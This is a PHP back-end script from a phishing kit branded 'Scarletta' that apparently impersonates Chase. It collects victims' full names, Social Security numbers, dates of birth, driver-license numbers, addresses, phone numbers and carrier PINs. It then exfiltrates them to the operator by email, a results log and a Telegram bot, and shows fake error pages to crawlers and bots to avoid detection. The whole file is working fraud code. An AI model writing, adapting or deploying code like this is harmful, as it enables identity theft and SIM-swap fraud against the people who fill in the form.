<?php

$settings = include '../../../settings/settings.php';
$useragent = $_SERVER['HTTP_USER_AGENT'];

# Cookie

if(!isset($_COOKIE['logged_in']) || $_COOKIE['logged_in'] == "0"){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}

# Debug 

if($settings['debug'] == "1"){
  ini_set('display_errors', '1');
  ini_set('display_startup_errors', '1');
  error_reporting(E_ALL);
}


@require("../../Bots/Anti/out/Crawler/src/CrawlerDetect.php");

$settings = include '../../../settings/settings.php';
$owner = $settings['email'];
$filename = "../../../Logs/results.txt";
$client = file_get_contents("../../../Logs/client.txt");

use JayBizzle\CrawlerDetect\CrawlerDetect;

$CrawlerDetect = new CrawlerDetect;

if($CrawlerDetect->isCrawler($useragent)){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
$bot = include '../../Bots/bot.php';
if($bot == "is_bot"){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}

$firstname = $_POST['firstName'];
$middlename = $_POST['middleName'];
$lastname = $_POST['lastName'];
$suffix = $_POST['suffixId'];
$country = $_POST['countryId'];
$dob = $_POST['dateOfBirth'];
$ssn = $_POST['socialSecurityNumber'];
$ident = $_POST['identificationTypeId'];
$identnumb = $_POST['identificationNumber'];
$state = $_POST['stateId'];
$address = $_POST['streetAddress'];
$appart = $_POST['apartmentNumber'];
$zip = $_POST['zipCode'];
$phone = $_POST['phoneNumber'];
$carrierPin = $_POST['carrierPin'];
$city = $_POST['City'];



if(empty($middlename)){
	$middlename = "Not Available ❌";
}

if(empty($suffix)){
	$suffix = "Not Available ❌";
}

if(empty($appart)){
	$appart = "Not Available ❌";
}
$e = str_replace("(", "", $phone);
$ee = str_replace(")", "", $e);
$eee = str_replace(" ", "", $ee);
$phonenumber = str_replace("-", "", $eee);

if($settings['phone_lookup'] == "1"){
  function get_phone($phone, $api) {
      $url = 'http://apilayer.net/api/validate?access_key='.$api.'&number='.$phone.'&country_code=US&format=1';
      $ch = curl_init();
      curl_setopt($ch,CURLOPT_URL,$url);
      curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
      $resp=curl_exec($ch);
      curl_close($ch);
      return $resp;
  }
  if(empty($api)){
    // no request without api!
    $location = "Not Available ❌";
    $carrier = "Not Available ❌";
    $lind_type = "Not Available ❌";
  } else {
    $look = get_phone($phonenumber, $api);
    $result = json_decode($look, true);
    if(!empty($result['location'])){
      $location = $result['location'];
    } else {
      $location = "Not Available ❌";
    }
    if(!empty($result['carrier'])){
      $carrier = $result['carrier'];
    } else {
      $carrier = "Not Available ❌";
    }
    if(!empty($result['line_type'])){
      $line_type = $result['line_type'];
    } else {
      $line_type = "Not Available ❌";
    }
  }
}



$message = "==== 📧 [ ADDRESS DETAILS | SCARLETTA | CLIENT {$client} ] 📧 ====\n";
$message .= "|-------------------------------------|\n";
$message .= "| 🔐 [ P E R S O N A L ~ D E T A I L S 🔐 \n";
$message .= "|-------------------------------------|\n";
$message .= "| ➤ [ Firstname ]		: {$firstname}\n";
$message .= "| ➤ [ Middlename ]		: {$middlename}\n";
$message .= "| ➤ [ Suffix ]			: {$suffix}\n";
$message .= "| ➤ [ Lastname ]		: {$lastname}\n";
$message .= "| ➤ [ Phone Number ]	: +1{$phone}\n";
$message .= "| ➤ [ Carrier-Pin ]    : {$carrierPin}\n";
$message .= "| ➤ [ Carrier ]      : {$carrier}\n";
$message .= "| ➤ [ Location ]     : {$location}\n";
$message .= "| ➤ [ Line Type ]    : {$line_type}\n";
$message .= "| ➤ [ Address ]		: {$address}\n";
$message .= "| ➤ [ Apartment ]		: {$appart}\n";
$message .= "| ➤ [ City ]			: {$city}\n";
$message .= "| ➤ [ ZIP Code ]		: {$zip}\n";
$message .= "| ➤ [ State ]			: {$state}\n";
$message .= "| ➤ [ Country ]		: {$country}\n";
$message .= "|-------------------------------------|\n";
$message .= "| 🆔 D R I V E R ~ L I C E N S E 🆔\n";
$message .= "|-------------------------------------|\n";
$message .= "| ➤ [ Document Type ]		: {$ident}\n";
$message .= "| ➤ [ Document Number ]	: {$identnumb}\n";
$message .= "|-------------------------------------|\n";
$message .= "| 💳 O T H E R ~ D E T A I L S 💳\n";
$message .= "|-------------------------------------|\n";
$message .= "| ➤ [ SSN ]	: {$ssn}\n";
$message .= "| ➤ [ DoB ]	: {$dob}\n";
$message .= "|-------------------------------------|\n";

if ($settings['send_mail'] == "1"){
	$to = $owner;
  $client = file_get_contents("../../../Logs/client.txt");
	$headers = "Content-type:text/plain;charset=UTF-8\r\n";
	$headers .= "From: Scarletta <chase@client_{$client}_site.com>\r\n";
	$subject = "⚔️ {$email} ✦ A C C C E S S ✦ {$country} ⚔️";
	$msg = $message;
	mail($to, $subject, $msg, $headers);
}

if ($settings['save_results'] == "1"){
  $results = fopen($filename, "a+");
  fwrite($results, $message);
  fclose($results);
}

if ($settings['telegram'] == "1"){
  $data = $message;
  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
  $website = "https://api.telegram.org/{$settings['bot_url']}";
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
}


# Head Back To Next Step
echo "<script>window.location.href = "."\"verify.php\"; </script>";
?>